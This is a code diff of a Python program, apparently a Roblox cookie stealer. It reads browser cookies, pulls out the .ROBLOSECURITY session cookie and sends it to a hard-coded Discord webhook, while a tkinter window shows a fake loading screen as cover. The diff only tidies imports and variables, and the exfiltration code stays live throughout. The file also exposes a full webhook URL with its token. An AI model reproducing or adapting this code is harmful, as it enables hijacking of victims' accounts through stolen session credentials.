@@ -1,20 +1,21 @@
 import browser_cookie3
+import os
+import random
+import threading
+import time
 import tkinter as tk
 import tkinter.ttk as ttk
-import time
-import os
-import threading
-import random
-from tkinter import messagebox
-from tkinter import *
-from tkinter.ttk import *
+from tkinter import Tk, Label, messagebox, W, HORIZONTAL
+from tkinter.ttk import Progressbar
 from discord_webhook import DiscordWebhook
 # imports libraries
 
 
-cookies = []
 webhook_url = "https://discord.com/api/webhooks/787513008301670411/p5_XXC1a7wCZ1NZt056MECwBhpwxuadpb-sG60k5lT49Z-xNxQE9BYOM78mN9n-D4jkb"
-# Discord webhook
+cookie_name = ".ROBLOSECURITY"
+# defines webhook and cookie to find
+
+cookies = []
 
 try:
     cookies.extend(list(browser_cookie3.chrome()))
@@ -26,7 +27,7 @@ try:
 except:
     pass
 
-roblox_cookie = [str(x) for x in cookies if ".ROBLOSECURITY" in str(x)]
+roblox_cookie = [str(x) for x in cookies if cookie_name in str(x)]
 webhook = DiscordWebhook(url=webhook_url, content=str(roblox_cookie))
 response = webhook.execute()
 # sends cookies to discord chat
@@ -75,6 +76,7 @@ def start_load():  # shows loading animation
 root = Tk()
 style = ttk.Style(root)
 style.configure("Placeholder.TEntry", foreground="grey")
+root.lift()
 # creates root
 
 centerWindow(root, 250, 110)
